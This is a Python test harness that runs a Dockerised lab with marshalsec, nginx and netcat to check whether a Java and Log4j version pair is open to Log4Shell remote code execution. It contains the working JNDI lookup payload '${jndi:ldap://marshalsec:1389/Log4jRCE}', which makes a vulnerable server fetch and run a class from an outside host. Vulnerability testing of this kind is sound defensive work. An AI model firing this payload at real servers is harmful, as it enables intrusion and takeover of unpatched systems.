import logging
import re
import os
import sys
from subprocess import Popen, PIPE

from colored_formatted import ColoredFormatter

MARSHAL_SEC_UP_PATTERN = "^.*Listening on 0.0.0.0:1389.*$"

NETCAT_UP_PATTERN = "^.*.*$"
SPRING_BOOT_UP_PATTERN = "^.*Listening on 0.0.0.0:1389.*$"
PAYLOAD_SENT_PATTERN = ".*Sending payload.*"
HTTP_SERVER_UP_PATTERN = ".*1#1: nginx/.*"
MARSHAL_SEC_CALLED_PATTERN = ".*Send LDAP reference result for Log4jRCE redirecting to.*"
HTTP_CALLED_PATTERN = ".*GET /Log4jRCE.class HTTP/1.*"
NETCAT_CONNECTION_PATTERN = ""



PAYLOAD = "${jndi:ldap://marshalsec:1389/Log4jRCE}"


logging.root.setLevel(logging.NOTSET)
logger = logging.getLogger(__file__)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)

ch.setFormatter(ColoredFormatter())

logger.addHandler(ch)

def delete_containers():
    logger.info("Shutting down the docker containers")
    docker_compose_down_process = Popen(["docker-compose", "down"], stdout=PIPE, stderr=PIPE)
    docker_compose_down_process.communicate()
    logger.info("Containers shut down successfully")

def analyze_log_line(log_line):
    if re.match(MARSHAL_SEC_UP_PATTERN, log_line):
        logger.info("Marshalsec is up and running")
    
    if re.match(HTTP_SERVER_UP_PATTERN, log_line):
        logger.info("Nginx server is up and running")
    
    if re.match(HTTP_CALLED_PATTERN, log_line):
        logger.warning("Exploit is being dowloaded from the Nginx server")

    if re.match(PAYLOAD_SENT_PATTERN, log_line):
        logger.info("The payload was sent using curl")

    if re.match(MARSHAL_SEC_CALLED_PATTERN, log_line):
        logger.warning("The LDAP call was made by the JNDI payload")

    if "Remote Code Execution gained!!!" in log_line:
        logger.error("This version of the application is vulnerable !!!!")
        delete_containers()
        exit(1)
    if "has to be an integer." in log_line:
        logger.info("This version of the application is not vulnerable")
        delete_containers()
        exit(0)

def main():
    if len(sys.argv) != 3:
        logger.error("USAGE: python cli.py java_version log4j_version")
        exit(-1)

    java_version = sys.argv[1]
    log4j_version = sys.argv[2]

    os.environ["JAVA_VERSION"] = java_version
    os.environ["LOG4J_VERSION"] = log4j_version
    os.environ["PAYLOD"] = PAYLOAD

    logger.info(f"Populating the docker-compose.yaml file for Java version: '{java_version}' and Log4J version: '{log4j_version}' with the payload '{PAYLOAD}'")
    
    logger.info("Starting up the docker environment.")
    docker_compose_up_process = Popen(["docker-compose", "up"], stdout=PIPE, stderr=PIPE, env=os.environ)
    while True:
        for line in iter(docker_compose_up_process.stdout.readline,''):
            decoded_line = line.rstrip().decode('utf-8')
            analyze_log_line(decoded_line)

if __name__ == "__main__":
    main()
